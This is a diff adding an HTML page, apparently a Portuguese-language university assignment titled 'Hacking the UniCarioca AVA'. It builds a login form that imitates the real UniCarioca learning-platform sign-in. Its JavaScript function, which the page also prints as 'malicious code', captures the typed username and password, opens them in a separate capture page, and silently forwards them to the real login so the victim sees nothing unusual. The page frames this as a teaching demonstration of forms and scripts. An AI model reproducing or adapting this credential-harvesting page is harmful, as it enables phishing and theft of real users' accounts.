@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>APS 01 - Desenvolvimento de Aplicações Web</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="css/estilo.css" type="text/css"/>
+        <script src="js/se_ferra.js"></script>
+
+        
+    </head>
+    <body style="background-image: url('imagens/bg.jpg');">
+        
+        <figure>
+        <img class="logo" src="imagens\logo.png" alt="Imagem não encontrada" height="100">
+        </figure>
+        
+        <h1>Hackeando o AVA da UniCarioca</h1>
+        <br>
+        <p class="texto">Este projeto tem como foco realizar a tentativa de capturar
+            o login e senha de acesso ao AVA da UniCarioca, para isso utilizará 
+            o FORM com método POST. <b class="destacar">O acesso ao AVA será realizado normalmente</b>, 
+            porém o login e senha serão capturados e exibidos em uma nova janela
+            de demonstração usando o método get.</p>
+        
+            <div><center>
+                    <b class="form">Formulário do Mal</b>
+                    
+                    <form action="http://ava.unicarioca.edu.br/login" method="post" target="_blank">
+                        <b class="form">Matricula: </b><input type="text" name="username" value="" id="user">
+                        <br>
+                        <b class="form">Senha: </b><input type="password" name="password" value="" id="pass">
+                        <br>
+                        <input type="submit" value="Entrar/Se Ferrar" onclick="capturar()">
+                    </form>
+            </center></div>
+        
+        
+        <b class="destacar">Links Interessantes:</b><br>
+        <ul>
+            <li><b><a style="color: red;" href="https://www.unicarioca.edu.br/" target="_blank">Site da UniCarioca</a></b></li>
+            <li><b><a style="color: green;" href="#CODIGO">Código Malicioso</a></b></li>
+            <li><b><a style="color: gold" href="captura/index.html" target="_blank">Página que mostra o usuario e senha</a></b></li>
+        </ul>
+        
+        
+        
+        <b class="destacar" style="font-size: 2em;">
+            Este trabalho é uma Atividade Supervisionada da disciplina Desenvolvimento de Aplicações Web.<br>
+            Contém os elementos básicos de uma página da Web, sejam códigos em HTML, CSS, JavaScript.<br>
+            Este trabalho exemplifica o uso da estrutura em HTML e formatação via CSS, funcionalidades do Formulário
+            tanto em método POST quanto GET, uso de funções em JavaScript.<br>
+
+        </b>
+        
+        
+        
+        <h2 id="CODIGO" style="color: blueviolet;">Código Malicioso</h2>
+        <code>
+ <p>function capturar(){<br /> var user = document.getElementById("user").value;<br /> var pass = document.getElementById("pass").value;<br /> <br /> window.open('captura/index.html?user='+user+'&amp;pass='+pass);<br /> <br /> document.body.innerHTML += '&lt;form id="ava" action="http://ava.unicarioca.edu.br/login" method="post"&gt;&lt;input type="hidden" name="username" value="'+user+'"&gt;&lt;input type="hidden" name="password" value="'+pass+'"&gt;&lt;/form&gt;';<br /> document.getElementById("ava").submit();<br />}</p>   </code>
+    
+    </body>
+</html>
